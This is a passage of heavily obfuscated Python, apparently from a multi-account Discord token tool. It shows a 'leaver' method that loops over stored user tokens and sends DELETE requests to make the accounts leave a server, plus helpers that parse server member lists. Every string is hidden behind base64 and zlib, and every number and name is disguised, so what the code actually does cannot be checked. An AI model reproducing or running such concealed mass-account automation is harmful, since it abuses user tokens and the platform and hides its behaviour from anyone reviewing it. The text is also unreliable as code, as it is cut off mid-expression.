                    𝗽𝗿𝘪𝘯𝙩(__𝙞𝙢𝘱𝗼𝙧𝙩__(𝙡𝘔𝘐𝘐𝗠𝙡𝗠𝙉𝘐𝙄𝙉𝗠𝗹𝗹𝙄𝗠𝗹𝘔𝘭𝗜𝘔𝙄𝗠𝘐𝗡𝙈𝙄𝗹𝙡𝘭𝗡𝗹[𝙧𝗼𝘂𝘯𝙙(𝙖𝗯𝙨(0.0 + 0j))]).b64decode(__𝘪𝙢𝘱𝘰𝙧𝙩__(𝘭𝗠𝙄𝘐𝙈𝗹𝘔𝙉𝙄𝗜𝘕𝙈𝙡𝗹𝙄𝙈𝘭𝙈𝗹𝙄𝘔𝘐𝗠𝙄𝘕𝙈𝘐𝘭𝗹𝙡𝙉𝗹[𝗿𝘰𝘶𝘯𝙙(𝘢𝙗𝘀(0.95389500123963 + 0.3001405114443005j))]).decompress(b'x\xda\x0b7.\xb1\x0c\xcav\xf3\nq\rsM56L\xf1\xcft2O\x0bv\xccO56(\x00\x00}\xf9\x08\xb8')).decode().format(𝙡𝙘, 𝗿, 𝘵𝙤𝙠𝙚𝘯[:𝗿𝗼𝘶𝘯𝘥(𝙖𝙗𝘀(10.11398162623408 + 22.862794572497023j))], 𝙧𝗲𝘴𝘱𝘰𝙣𝘴𝗲.json()[__𝙞𝗺𝙥𝗼𝗿𝙩__(𝘭𝘔𝗜𝙄𝘔𝘭𝙈𝘕𝗜𝙄𝙉𝘔𝗹𝙡𝙄𝘔𝙡𝙈𝗹𝙄𝗠𝙄𝙈𝗜𝘕𝗠𝘐𝗹𝙡𝘭𝗡𝗹[𝙧𝙤𝘂𝙣𝗱(𝗮𝗯𝘴(0.0 + 0j))]).b64decode(__𝗶𝗺𝙥𝗼𝙧𝘁__(𝙡𝗠𝘐𝗜𝙈𝘭𝘔𝘕𝘐𝘐𝗡𝗠𝙡𝘭𝗜𝙈𝘭𝘔𝙡𝙄𝗠𝘐𝘔𝙄𝘕𝗠𝙄𝙡𝙡𝙡𝗡𝗹[𝙧𝘰𝙪𝙣𝘥(𝗮𝗯𝘀(0.6143023869505758 + 0.7890707049351313j))]).decompress(b'x\xdaK\n\x0f\xabJ6r\xcb\x8b\n\xb4\xb5\x05\x00\x1bY\x03\xf8')).decode()]))
        except 𝙀𝘅𝗰𝗲𝗽𝙩𝗶𝘰𝗻 as e:
            𝙥𝙧𝗶𝗻𝙩(__𝗶𝘮𝙥𝘰𝙧𝘁__(𝙡𝘔𝗜𝙄𝘔𝙡𝙈𝘕𝗜𝙄𝙉𝙈𝙡𝙡𝗜𝘔𝙡𝗠𝗹𝘐𝙈𝘐𝘔𝙄𝙉𝗠𝗜𝘭𝙡𝘭𝙉𝗹[𝗿𝙤𝙪𝙣𝙙(𝗮𝗯𝙨(0.0 + 0j))]).b64decode(__𝘪𝗺𝗽𝙤𝗿𝘁__(𝗹𝘔𝙄𝗜𝙈𝘭𝘔𝗡𝙄𝙄𝙉𝗠𝙡𝗹𝘐𝙈𝙡𝗠𝘭𝘐𝗠𝙄𝘔𝘐𝗡𝙈𝙄𝗹𝗹𝘭𝘕𝗹[𝙧𝘰𝘂𝙣𝘥(𝘢𝙗𝘀(0.39172123667367775 + 0.9200839487453547j))]).decompress(b'x\xda\x0b7.\xb1\x0c\n\xf3\n\x0e1\xf42O\x0b30\xf3\xf4(\xb1\xf4t\xce(L2\xca)\x8d\x8a\xf0,\x00\x00\xa0e\n(')).decode().format(𝗹𝙘, 𝗿, 𝗲))

    def leaver(self, token, guild):
        𝙤𝘴.system(__𝗶𝗺𝙥𝗼𝗿𝙩__(𝙡𝘔𝗜𝗜𝙈𝗹𝗠𝘕𝙄𝗜𝗡𝘔𝙡𝘭𝙄𝘔𝙡𝘔𝗹𝙄𝗠𝘐𝘔𝙄𝘕𝗠𝗜𝘭𝗹𝘭𝗡𝙡[𝗿𝗼𝘂𝙣𝙙(𝘢𝘣𝘴(0.0 + 0j))]).b64decode(__𝙞𝘮𝗽𝘰𝙧𝙩__(𝙡𝙈𝙄𝗜𝗠𝙡𝗠𝙉𝘐𝘐𝙉𝙈𝙡𝙡𝗜𝙈𝙡𝘔𝗹𝗜𝙈𝘐𝗠𝗜𝙉𝘔𝙄𝘭𝗹𝗹𝘕𝘭[𝙧𝗼𝘂𝙣𝙙(𝗮𝘣𝙨(0.6237248724411917 + 0.7816439621069295j))]).decompress(b'x\xdaKq\xcf1Hr\x0fM\x0fv\x0f+N\x8c\x08+\xf1t6H\x0fq\x0f\xcbH\xc9\r\xab\x04\x00\x89(\t\xaf')).decode())
        try:

            def get_guild_name(guild):
                𝘪𝙣_𝘨𝘂𝙞𝙡𝗱 = []
                for 𝘁𝗼𝘬𝘦𝙣 in 𝙩𝘰𝗸𝗲𝘯𝘴:
                    𝘳𝙚𝘴𝘱𝙤𝙣𝘀𝗲 = 𝘀𝙚𝙨𝘴𝗶𝘰𝘯.get(__𝙞𝗺𝙥𝘰𝗿𝙩__(𝘭𝙈𝙄𝗜𝘔𝗹𝙈𝙉𝗜𝘐𝙉𝗠𝙡𝙡𝗜𝗠𝙡𝗠𝗹𝙄𝙈𝗜𝙈𝘐𝙉𝗠𝙄𝙡𝗹𝘭𝗡𝙡[𝘳𝘰𝙪𝘯𝗱(𝗮𝙗𝘀(0.0 + 0j))]).b64decode(__𝗶𝗺𝘱𝘰𝗿𝘁__(𝙡𝗠𝗜𝙄𝗠𝘭𝙈𝙉𝙄𝙄𝘕𝗠𝘭𝘭𝗜𝗠𝘭𝘔𝗹𝙄𝗠𝗜𝙈𝗜𝘕𝙈𝙄𝘭𝗹𝘭𝗡𝙡[𝙧𝗼𝘂𝙣𝙙(𝗮𝗯𝙨(0.3193664680763345 + 0.9476312885655727j))]).decompress(b'x\xdaK\xf4\x082H\xf6\xf05\xf3\xa9\xb4\xccN\x8c\xf0\xcbJ2\xf6\xca\xf6\xc9\xf5+K\n\xb6\xccHv\xcf.K\xc9\xca.\x8b2\x0e+Hr\x0f\xaa\xf21.\xb1\x04\x00\x8cJ\x10\x7f')).decode().format(𝙜𝙪𝙞𝙡𝘥), headers=𝘴𝘦𝙡𝙛.headers(𝘵𝗼𝘬𝙚𝗻))
                    match 𝗿𝗲𝙨𝙥𝘰𝙣𝘀𝗲.status_code:
                        case 𝗿𝙤𝘶𝗻𝗱(𝘢𝗯𝘴(101.37336095585047 + 172.40487721788747j)):
                            𝗶𝗻_𝙜𝘶𝗶𝙡𝙙.append(𝘁𝙤𝙠𝗲𝙣)
                            try:
                                return 𝘳𝘦𝘀𝙥𝙤𝘯𝘀𝘦.json().get(__𝘪𝘮𝗽𝘰𝗿𝘵__(𝘭𝗠𝘐𝗜𝘔𝘭𝙈𝘕𝘐𝘐𝗡𝘔𝗹𝘭𝙄𝙈𝘭𝗠𝗹𝘐𝗠𝘐𝗠𝗜𝗡𝘔𝗜𝙡𝙡𝙡𝘕𝙡[𝘳𝙤𝘂𝙣𝗱(𝘢𝙗𝘀(0.0 + 0j))]).b64decode(__𝙞𝙢𝙥𝗼𝗿𝙩__(𝙡𝗠𝙄𝗜𝙈𝗹𝙈𝘕𝘐𝙄𝘕𝗠𝘭𝘭𝘐𝘔𝘭𝗠𝘭𝗜𝗠𝙄𝘔𝗜𝙉𝙈𝙄𝙡𝘭𝙡𝗡𝙡[𝗿𝗼𝘂𝗻𝘥(𝗮𝙗𝘀(0.6411452859142412 + 0.7674195217414956j))]).decompress(b'x\xdaK\xcau+\x89\n\xb4\xb5\x05\x00\r\r\x02\xaf')).decode())
                            except:
                                return 𝗴𝙪𝙞𝘭𝗱
                if not 𝙞𝘯_𝗴𝙪𝘪𝙡𝗱:
                    return 𝗴𝘶𝙞𝘭𝘥
            𝙨𝙚𝙩𝘢𝘵𝘵𝘳(𝘀𝗲𝘭𝗳, 'guild', 𝙜𝘦𝘁_𝘨𝘂𝘪𝗹𝗱_𝙣𝗮𝘮𝙚(𝗴𝘶𝗶𝘭𝘥))
            𝗽𝘢𝘺𝙡𝘰𝘢𝙙 = {__𝗶𝙢𝗽𝙤𝘳𝘵__(𝘭𝙈𝙄𝘐𝗠𝙡𝙈𝙉𝗜𝙄𝗡𝘔𝘭𝙡𝘐𝘔𝗹𝙈𝗹𝙄𝗠𝙄𝗠𝙄𝙉𝗠𝗜𝘭𝘭𝗹𝗡𝙡[𝘳𝘰𝘶𝘯𝙙(𝘢𝘣𝙨(0.0 + 0j))]).b64decode(__𝙞𝙢𝗽𝘰𝗿𝘁__(𝘭𝘔𝗜𝙄𝘔𝘭𝙈𝙉𝗜𝙄𝘕𝘔𝙡𝗹𝙄𝗠𝗹𝘔𝙡𝗜𝗠𝗜𝙈𝙄𝘕𝙈𝙄𝗹𝗹𝘭𝙉𝙡[𝗿𝘰𝙪𝙣𝗱(𝗮𝙗𝘴(0.27673585218128727 + 0.9609460276818343j))]).decompress(b'x\xdaK\xf2\x08\xabL4\xca)\x8d*\xb7\xb5\x05\x00\x1c\x14\x049')).decode(): False}
            𝗿𝙚𝘴𝘱𝗼𝗻𝘀𝘦 = 𝙨𝘦𝙨𝙨𝙞𝘰𝙣.delete(__𝙞𝗺𝘱𝙤𝘳𝙩__(𝙡𝙈𝙄𝘐𝗠𝘭𝘔𝘕𝙄𝗜𝙉𝙈𝙡𝘭𝗜𝗠𝗹𝗠𝗹𝘐𝘔𝗜𝙈𝘐𝘕𝘔𝙄𝗹𝙡𝙡𝘕𝙡[𝘳𝙤𝘂𝙣𝗱(𝗮𝙗𝙨(0.0 + 0j))]).b64decode(__𝙞𝗺𝗽𝘰𝗿𝘁__(𝗹𝘔𝗜𝙄𝘔𝙡𝘔𝗡𝘐𝗜𝘕𝘔𝙡𝗹𝙄𝘔𝗹𝘔𝗹𝙄𝙈𝘐𝗠𝙄𝗡𝙈𝗜𝘭𝗹𝗹𝙉𝙡[𝗿𝗼𝙪𝘯𝙙(𝘢𝘣𝘴(0.5029918253070178 + 0.8642911683421939j))]).decompress(b'x\xdaK\xf4\x082H\xf6\xf05\xf3\xa9\xb4\xccN\x8c\xf0\xcbJ2\xf6\xca\xf6\xc9\xf5+K\n\xb6\xccHv\xcf.K\xc9\x02\xe2\x08\xbf\x9c\xe4<\xdf\xb2@w\xc3\x1c\x1f\xa3\x14\xc3\xc4\xf0\x8a\xec\xe4JK\xf3\xb4@[[\x00\xc7\xe9\x15\xf5')).decode().format(𝘨𝙪𝙞𝗹𝙙), json=𝗽𝗮𝘺𝗹𝙤𝘢𝘥, headers=𝙨𝙚𝘭𝘧.headers(𝘵𝙤𝗸𝙚𝘯))
            match 𝙧𝙚𝘴𝙥𝙤𝗻𝙨𝗲.status_code:
                case 𝗿𝘰𝘶𝙣𝙙(𝗮𝗯𝙨(24.608862730625592 + 202.51025622201269j)):
                    𝘱𝙧𝙞𝙣𝘁(__𝙞𝗺𝙥𝗼𝘳𝘵__(𝘭𝘔𝙄𝙄𝘔𝙡𝘔𝗡𝘐𝗜𝘕𝙈𝙡𝗹𝙄𝙈𝗹𝗠𝙡𝙄𝙈𝙄𝘔𝘐𝗡𝘔𝗜𝗹𝘭𝙡𝘕𝙡[𝗿𝙤𝘶𝙣𝘥(𝙖𝗯𝘴(0.0 + 0j))]).b64decode(__𝘪𝘮𝙥𝙤𝙧𝘁__(𝙡𝗠𝘐𝘐𝗠𝙡𝙈𝗡𝙄𝗜𝙉𝙈𝗹𝙡𝙄𝗠𝘭𝗠𝙡𝙄𝘔𝘐𝘔𝘐𝘕𝙈𝗜𝙡𝗹𝙡𝙉𝗹[𝙧𝗼𝘶𝗻𝗱(𝗮𝙗𝘴(0.9530569850358845 + 0.3027909894206064j))]).decompress(b'x\xda\x0b7.\xb1\x0cq\rs\x0f\xf3(\xb1\x8c\x08\xb4\xb5\x05\x00*\x03\x04\xdc')).decode().format(𝙡𝙘, 𝙧), 𝗙𝘰𝘳𝘦.LIGHTGREEN_EX, 𝙩𝙤𝗸𝗲𝙣[:𝗿𝙤𝘂𝘯𝗱(𝙖𝙗𝘀(17.02723404015946 + 18.305007537328002j))], 𝗿, 𝘴𝘦𝗹𝗳.guild)
                case _:
                    𝘱𝗿𝙞𝗻𝘁(__𝙞𝗺𝘱𝗼𝗿𝘁__(𝗹𝗠𝗜𝘐𝙈𝘭𝙈𝘕𝗜𝙄𝙉𝙈𝘭𝙡𝗜𝗠𝗹𝘔𝙡𝘐𝘔𝙄𝘔𝙄𝙉𝗠𝙄𝙡𝘭𝘭𝗡𝘭[𝗿𝘰𝘶𝘯𝘥(𝘢𝗯𝘀(0.0 + 0j))]).b64decode(__𝘪𝘮𝙥𝙤𝙧𝘵__(𝙡𝘔𝙄𝗜𝗠𝗹𝙈𝘕𝗜𝙄𝘕𝘔𝗹𝘭𝘐𝗠𝙡𝙈𝙡𝘐𝗠𝘐𝘔𝙄𝘕𝗠𝗜𝗹𝗹𝙡𝙉𝗹[𝙧𝘰𝙪𝙣𝘥(𝗮𝘣𝙨(0.29777549235807155 + 0.9546359285879136j))]).decompress(b'x\xda\x0b7.\xb1\x0c\xcav\xf3\nq\rsM56L\x01\x00*T\x04\xe6')).decode().format(𝘭𝗰, 𝗿), 𝘍𝘰𝙧𝘦.LIGHTRED_EX, 𝘁𝙤𝙠𝙚𝘯[:𝘳𝗼𝙪𝙣𝗱(𝘢𝘣𝘀(24.626592592467677 + 4.304757517516652j))], 𝘳𝗲𝘴𝙥𝘰𝗻𝘴𝗲.json().get(__𝗶𝗺𝙥𝗼𝙧𝘵__(𝙡𝗠𝘐𝗜𝙈𝗹𝙈𝘕𝗜𝗜𝘕𝗠𝗹𝗹𝙄𝙈𝘭𝙈𝘭𝘐𝗠𝗜𝗠𝙄𝗡𝗠𝗜𝘭𝗹𝗹𝘕𝗹[𝘳𝙤𝘂𝗻𝗱(𝘢𝙗𝘴(0.0 + 0j))]).b64decode(__𝙞𝘮𝗽𝗼𝗿𝘁__(𝘭𝘔𝗜𝘐𝗠𝙡𝘔𝘕𝗜𝗜𝘕𝘔𝘭𝘭𝗜𝙈𝗹𝘔𝘭𝗜𝙈𝗜𝘔𝙄𝘕𝘔𝗜𝘭𝗹𝘭𝘕𝗹[𝗿𝙤𝘶𝘯𝙙(𝘢𝘣𝘀(0.33504262582303745 + 0.942202971170015j))]).decompress(b'x\xdaK\n\x0f\xabJ6r\xcb\x8b\n\xb4\xb5\x05\x00\x1bY\x03\xf8')).decode()), 𝗿)
        except 𝗘𝙭𝘤𝘦𝗽𝙩𝙞𝙤𝙣 as e:
            𝙥𝙧𝘪𝗻𝘵(__𝙞𝘮𝙥𝘰𝘳𝙩__(𝘭𝘔𝗜𝗜𝘔𝘭𝘔𝙉𝙄𝙄𝙉𝗠𝗹𝘭𝘐𝗠𝗹𝙈𝗹𝗜𝗠𝙄𝗠𝗜𝗡𝘔𝘐𝗹𝗹𝘭𝗡𝘭[𝙧𝘰𝘶𝗻𝘥(𝘢𝘣𝘀(0.0 + 0j))]).b64decode(__𝘪𝘮𝙥𝙤𝘳𝘁__(𝙡𝘔𝙄𝙄𝙈𝗹𝘔𝙉𝘐𝘐𝗡𝗠𝗹𝘭𝘐𝗠𝘭𝘔𝗹𝙄𝗠𝙄𝗠𝗜𝘕𝗠𝘐𝘭𝘭𝗹𝘕𝘭[𝘳𝙤𝘂𝙣𝙙(𝗮𝗯𝘴(0.6039036872569524 + 0.7970572981395108j))]).decompress(b'x\xda\x0b7.\xb1\x0c\n\xf3\n\x0e1\xf42O\x0b3\xb0\x05\x00)\x10\x04\xac')).decode().format(𝙡𝘤, 𝗿), 𝙁𝘰𝗿𝘦.LIGHTRED_EX, 𝘳, 𝘵𝙤𝗸𝙚𝗻[:𝗿𝗼𝘂𝘯𝙙(𝘢𝗯𝙨(24.076575537310863 + 6.731902435134078j))], 𝘦)

class Utils:

    def rangeCorrector(ranges):
        if [𝙧𝙤𝘶𝙣𝘥(𝗮𝗯𝙨(0.0 + 0j)), 𝘳𝙤𝘂𝘯𝙙(𝘢𝙗𝘀(97.80673905076374 + 15.32454881083965j))] not in 𝘳𝙖𝘯𝗴𝗲𝘀:
            𝘳𝗮𝘯𝘨𝘦𝘴.insert(𝘳𝘰𝘂𝘯𝘥(𝙖𝘣𝘴(0.0 + 0j)), [𝘳𝘰𝘂𝘯𝗱(𝘢𝘣𝘴(0.0 + 0j)), 𝗿𝗼𝙪𝙣𝙙(𝙖𝗯𝘴(25.563922603556996 + 95.64248983124263j))])
        return 𝙧𝙖𝗻𝗴𝗲𝘴

    def getRanges(index, multiplier, memberCount):
        𝗶𝗻𝘪𝘵𝗶𝘢𝘭𝗡𝙪𝗺 = 𝙆𝗣𝘦𝙔𝙭𝘁𝗯𝙃𝗕4𝙆𝗮𝘱𝗮𝘘𝘓𝘔𝙌𝗵𝙫2𝘆𝗸𝘈4𝘮𝘰𝘁𝙑𝘔𝘟𝘴.mro()[6](𝙞𝘯𝙙𝙚𝘹 * 𝙢𝙪𝙡𝘁𝘪𝙥𝘭𝗶𝗲𝘳)
        𝘳𝘢𝗻𝘨𝘦𝙨𝙇𝙞𝘴𝘁 = [[𝙞𝘯𝘪𝘵𝗶𝗮𝗹𝙉𝘶𝙢, 𝙞𝙣𝘪𝙩𝗶𝗮𝗹𝗡𝘶𝙢 + 𝘳𝙤𝘂𝙣𝙙(𝙖𝘣𝘀(57.43988525511237 + 80.63286911600954j))]]
        if 𝗺𝗲𝘮𝗯𝙚𝗿𝗖𝗼𝘶𝙣𝘵 > 𝙞𝗻𝙞𝘁𝗶𝗮𝙡𝙉𝙪𝙢 + 𝗿𝙤𝙪𝙣𝗱(𝗮𝘣𝘀(39.03517195766854 + 90.97942267477437j)):
            𝗿𝙖𝘯𝙜𝗲𝘀𝘓𝙞𝘀𝘁.append([𝗶𝘯𝗶𝘵𝘪𝘢𝘭𝘕𝙪𝗺 + 𝙧𝙤𝙪𝘯𝙙(𝘢𝙗𝘀(64.09748476453365 + 76.75618832941339j)), 𝗶𝗻𝗶𝘁𝗶𝗮𝗹𝗡𝘂𝙢 + 𝗿𝙤𝙪𝘯𝗱(𝘢𝘣𝘴(54.84202960245511 + 191.2938885304061j))])
        return 𝗨𝘁𝙞𝙡𝘴.rangeCorrector(𝗿𝙖𝗻𝘨𝗲𝘴𝘓𝗶𝙨𝘵)

    def parseGuildMemberListUpdate(response):
        𝗺𝘦𝙢𝙗𝘦𝙧𝘥𝗮𝙩𝗮 = {__𝙞𝙢𝙥𝙤𝘳𝘵__(𝘭𝗠𝗜𝘐𝘔𝗹𝙈𝙉𝘐𝗜𝗡𝘔𝘭𝗹𝗜𝘔𝘭𝙈𝙡𝘐𝙈𝗜𝗠𝗜𝗡𝙈𝗜𝙡𝗹𝗹𝘕𝙡[𝙧𝗼𝙪𝘯𝘥(𝙖𝙗𝘴(0.0 + 0j))]).b64decode(__𝙞𝗺𝗽𝗼𝙧𝘵__(𝗹𝗠𝙄𝗜𝙈𝙡𝗠𝘕𝙄𝘐𝘕𝘔𝘭𝙡𝙄𝘔𝘭𝙈𝙡𝗜𝘔𝘐𝗠𝘐𝗡𝘔𝘐𝙡𝗹𝙡𝗡𝗹[𝘳𝘰𝙪𝘯𝙙(𝗮𝘣𝘀(0.663687776057066 + 0.7480097164558933j))]).decompress(b'x\xdaK22-N\x0c7\xcd\x890\xf2+K\t75\x00\x00+q\x05\x04')).decode(): 𝘳𝗲𝙨𝙥𝘰𝘯𝘴𝗲[__𝘪𝘮𝙥𝗼𝙧𝘁__(𝘭𝗠𝙄𝘐𝘔𝘭𝙈𝙉𝗜𝗜𝗡𝙈𝗹𝘭𝗜𝗠𝘭𝘔𝙡𝙄𝘔𝘐𝘔𝘐𝘕𝘔𝘐𝘭𝗹𝗹𝗡𝙡[𝘳𝘰𝙪𝙣𝘥(𝘢𝘣𝘀(0.0 + 0j))]).b64decode(__𝙞𝘮𝘱𝗼𝗿𝘵__(𝘭𝙈𝗜𝗜𝘔𝗹𝗠𝙉𝗜𝙄𝙉𝙈𝗹𝙡𝘐𝘔𝘭𝘔𝘭𝘐𝘔𝗜𝙈𝗜𝘕𝗠𝗜𝗹𝘭𝙡𝙉𝘭[𝘳𝘰𝙪𝗻𝙙(𝗮𝗯𝘀(0.6543000353008886 + 0.7562350585666179j))]).decompress(b'x\xda\x8br\xb4\xb5\x05\x00\x02\xe6\x01\x16')).decode()][__𝙞𝘮𝗽𝗼𝗿𝘁__(𝗹𝗠𝘐𝙄𝗠𝗹𝙈𝗡𝘐𝘐𝗡𝘔𝘭𝗹𝗜𝗠𝗹𝘔𝘭𝙄𝙈𝘐𝘔𝗜𝗡𝙈𝗜𝗹𝙡𝗹𝙉𝘭[𝙧𝘰𝙪𝘯𝘥(𝙖𝙗𝙨(0.0 + 0j))]).b64decode(__𝙞𝙢𝘱𝙤𝙧𝘵__(𝘭𝙈𝘐𝗜𝙈𝘭𝙈𝘕𝘐𝙄𝙉𝙈𝗹𝘭𝘐𝙈𝙡𝙈𝗹𝙄𝙈𝘐𝙈𝗜𝙉𝗠𝘐𝗹𝙡𝘭𝙉𝙡[𝗿𝘰𝘂𝙣𝘥(𝙖𝗯𝘴(0.3032180014466711 + 0.9529212158403687j))]).decompress(b'x\xdaK22-N\x0c7\xcd\x890\xf2+K\t75\x00\x00+q\x05\x04')).decode()], __𝙞𝙢𝗽𝙤𝗿𝙩__(𝘭𝗠𝘐𝗜𝗠𝙡𝘔𝙉𝙄𝘐𝘕𝘔𝘭𝙡𝗜𝘔𝘭𝗠𝘭𝙄𝗠𝗜𝙈𝘐𝘕𝗠𝘐𝗹𝘭𝗹𝘕𝙡[𝙧𝙤𝘂𝙣𝗱(𝙖𝗯𝘀(0.0 + 0j))]).b64decode(__𝘪𝗺𝘱𝗼𝗿𝘵__(𝙡𝘔𝙄𝗜𝗠𝙡𝘔𝙉𝗜𝗜𝗡𝗠𝙡𝘭𝙄𝘔𝙡𝗠𝗹𝗜𝙈𝘐𝗠𝗜𝘕𝘔𝘐𝗹𝗹𝘭𝘕𝙡[𝙧𝘰𝘶𝙣𝙙(𝘢𝙗𝙨(0.5487871725896142 + 0.8359621039264262j))]).decompress(b'x\xdaK\n\x0f+\x89\xcc\r\xab\x8c0\xf2+K\t75\x00\x001\xc8\x05\x87')).decode(): 𝙧𝗲𝘴𝗽𝗼𝘯𝘴𝘦[__𝙞𝙢𝘱𝗼𝙧𝘁__(𝙡𝙈𝙄𝙄𝗠𝘭𝘔𝙉𝙄𝘐𝗡𝗠𝗹𝘭𝗜𝘔𝙡𝙈𝙡𝗜𝘔𝗜𝗠𝗜𝗡𝘔𝙄𝙡𝙡𝘭𝘕𝘭[𝙧𝘰𝘶𝗻𝗱(𝗮𝙗𝘀(0.0 + 0j))]).b64decode(__𝗶𝗺𝗽𝗼𝘳𝘵__(𝙡𝗠𝙄𝘐𝗠𝘭𝙈𝗡𝘐𝗜𝙉𝗠𝙡𝙡𝙄𝗠𝘭𝙈𝗹𝙄𝘔𝙄𝙈𝗜𝘕𝗠𝙄𝗹𝙡𝗹𝙉𝘭[𝘳𝙤𝘂𝘯𝗱(𝙖𝙗𝘀(0.41327372952386243 + 0.9106068440800549j))]).decompress(b'x\xda\x8br\xb4\xb5\x05\x00\x02\xe6\x01\x16')).decode()][__𝗶𝗺𝗽𝗼𝙧𝙩__(𝘭𝘔𝘐𝘐𝙈𝙡𝗠𝗡𝘐𝘐𝘕𝘔𝗹𝘭𝙄𝗠𝗹𝘔𝙡𝙄𝗠𝙄𝘔𝙄𝗡𝘔𝙄𝗹𝗹𝘭𝗡𝗹[𝗿𝙤𝘂𝘯𝘥(𝗮𝘣𝘀(0.0 + 0j))]).b64decode(__𝘪𝙢𝘱𝙤𝙧𝘵__(𝙡𝙈𝗜𝘐𝘔𝘭𝙈𝗡𝘐𝗜𝗡𝙈𝗹𝗹𝙄𝘔𝙡𝙈𝙡𝘐𝘔𝘐𝘔𝘐𝘕𝗠𝗜𝘭𝗹𝗹𝗡𝘭[𝗿𝙤𝙪𝘯𝗱(𝘢𝙗𝙨(0.9961989414238497 + 0.08710722763353959j))]).decompress(b'x\xdaK\n\x0f+\x89\xcc\r\xab\x8c0\xf2+K\t75\x00\x001\xc8\x05\x87')).decode()], __𝗶𝗺𝘱𝙤𝙧𝘁__(𝘭𝙈𝘐𝙄𝗠𝙡𝘔𝘕𝘐𝙄𝗡𝙈𝗹𝗹𝗜𝘔𝘭𝘔𝗹𝗜𝙈𝘐𝗠𝘐𝗡𝘔𝗜𝗹𝘭𝘭𝙉𝙡[𝗿𝙤𝘶𝗻𝙙(𝙖𝙗𝘀(0.0 + 0j))]).b64decode(__𝘪𝙢𝘱𝗼𝗿𝙩__(𝗹𝗠𝙄𝘐𝘔𝙡𝘔𝗡𝙄𝗜𝙉𝗠𝗹𝘭𝙄𝙈𝙡𝘔𝘭𝘐𝗠𝘐𝗠𝗜𝗡𝙈𝘐𝘭𝘭𝗹𝙉𝗹[𝙧𝘰𝘂𝗻𝙙(𝘢𝙗𝘀(0.08519511358587362 + 0.9963642871064228j))]).decompress(b'x\xdaK\x0c\x0f\xb4\x05\x00\x03l\x01G')).decode(): 𝘳𝘦𝘴𝗽𝘰𝙣𝘴𝗲[__𝙞𝗺𝘱𝘰𝘳𝙩__(𝙡𝘔𝙄𝗜𝗠𝗹𝘔𝘕𝙄𝙄𝗡𝗠𝘭𝘭𝘐𝘔𝙡𝙈𝗹𝘐𝘔𝗜𝗠𝘐𝘕𝗠𝘐𝙡𝙡𝙡𝘕𝗹[𝙧𝗼𝘂𝘯𝘥(𝘢𝙗𝙨(0.0 + 0j))]).b64decode(__𝗶𝘮𝘱𝗼𝗿𝘁__(𝙡𝘔𝗜𝙄𝘔𝘭𝘔𝗡𝙄𝗜𝙉𝘔𝘭𝘭𝗜𝗠𝙡𝙈𝗹𝙄𝙈𝙄𝙈𝙄𝗡𝗠𝙄𝘭𝘭𝗹𝗡𝘭[𝘳𝙤𝘂𝗻𝘥(𝙖𝙗𝙨(0.06133525002643814 + 0.9981172211239491j))]).decompress(b'x\xda\x8br\xb4\xb5\x05\x00\x02\xe6\x01\x16')).decode()][__𝗶𝗺𝗽𝙤𝗿𝙩__(𝙡𝘔𝘐𝙄𝗠𝘭𝙈𝘕𝙄𝙄𝙉𝘔𝙡𝙡𝗜𝗠𝘭𝗠𝘭𝘐𝙈𝙄𝙈𝘐𝘕𝗠𝙄𝗹𝙡𝙡𝙉𝙡[𝙧𝘰𝘂𝗻𝙙(𝘢𝙗𝘴(0.0 + 0j))]).b64decode(__𝙞𝙢𝙥𝙤𝙧𝘁__(𝗹𝗠𝙄𝘐𝙈𝗹𝙈𝗡𝘐𝙄𝘕𝘔𝘭𝗹𝙄𝘔𝗹𝙈𝘭𝘐𝗠𝗜𝗠𝗜𝗡𝙈𝙄𝗹𝙡𝘭𝗡𝗹[𝗿𝗼𝘂𝗻𝗱(𝙖𝙗𝙨(0.8987593519191027 + 0.4384422736666191j))]).decompress(b'x\xdaK\x0c\x0f\xb4\x05\x00\x03l\x01G')).decode()], __𝘪𝘮𝗽𝘰𝙧𝘵__(𝗹𝙈𝘐𝙄𝗠𝙡𝗠𝘕𝙄𝗜𝙉𝙈𝗹𝙡𝗜𝗠𝗹𝗠𝙡𝗜𝘔𝙄𝗠𝗜𝘕𝘔𝘐𝙡𝙡𝗹𝘕𝘭[𝙧𝗼𝘶𝙣𝘥(𝙖𝘣𝘴(0.0 + 0j))]).b64decode(__𝘪𝙢𝘱𝘰𝙧𝙩__(𝘭𝙈𝙄𝘐𝘔𝙡𝘔𝘕𝗜𝘐𝙉𝗠𝘭𝙡𝗜𝙈𝗹𝗠𝘭𝗜𝗠𝗜𝘔𝘐𝙉𝗠𝙄𝙡𝘭𝘭𝗡𝙡[𝙧𝗼𝘶𝗻𝘥(𝗮𝗯𝘀(0.18306410988782473 + 0.9831009773522649j))]).decompress(b'x\xda\x8b2\x0e+Hr\x0fJK\x0c\x0f\xb4\x05\x00\x1a\x14\x03\xfb')).decode(): 𝘳𝗲𝙨𝙥𝘰𝗻𝘴𝙚[__𝙞𝗺𝘱𝗼𝙧𝙩__(𝙡𝘔𝘐𝗜𝙈𝗹𝙈𝗡𝙄𝙄𝙉𝘔𝙡𝙡𝗜𝘔𝗹𝙈𝘭𝗜𝙈𝙄𝘔𝙄𝙉𝙈𝗜𝗹𝗹𝗹𝘕𝗹[𝘳𝗼𝙪𝙣𝘥(𝘢𝗯𝘀(0.0 + 0j))]).b64decode(__𝗶𝙢𝘱𝗼𝘳𝘵__(𝗹𝗠𝙄𝘐𝗠𝗹𝙈𝙉𝗜𝘐𝙉𝗠𝙡𝙡𝘐𝙈𝘭𝗠𝘭𝘐𝙈𝘐𝘔𝗜𝙉𝙈𝘐𝗹𝗹𝗹𝗡𝗹[𝙧𝘰𝙪𝙣𝘥(𝘢𝘣𝘀(0.872494117401933 + 0.4886246157317722j))]).decompress(b'x\xda\x8br\xb4\xb5\x05\x00\x02\xe6\x01\x16')).decode()][__𝙞𝗺𝙥𝗼𝘳𝘵__(𝘭𝘔𝘐𝘐𝙈𝗹𝙈𝙉𝗜𝗜𝘕𝗠𝗹𝘭𝗜𝘔𝙡𝘔𝗹𝘐𝙈𝘐𝙈𝗜𝙉𝗠𝙄𝙡𝙡𝙡𝘕𝗹[𝘳𝙤𝙪𝘯𝙙(𝘢𝗯𝘀(0.0 + 